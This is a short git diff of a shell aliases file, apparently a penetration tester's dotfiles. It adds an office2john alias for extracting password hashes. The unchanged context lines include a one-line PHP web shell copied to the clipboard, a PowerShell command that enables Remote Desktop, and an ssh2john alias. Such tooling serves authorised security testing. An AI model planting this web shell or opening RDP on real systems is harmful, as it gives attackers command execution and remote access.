@@ -8,3 +8,4 @@ alias getwinfr='echo -n "Set-WinSystemLocale fr-FR; Set-WinUserLanguageList -Lan
 alias getwinrdp='echo "Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\" -Name \"fDenyTSConnections\" -Value 0" | xclip -selection clipboard -rmlastnl && echo "CMD copié dans le presse-papiers"'
 alias ssh2john='ssh2john.py'
 alias phprevshell='echo "<?php system(\$_GET[\"cmd\"]); ?>" | xclip -selection clipboard -rmlastnl && echo "[+] php rev shell copied to clipboard"'
+alias office2john="office2john.py"
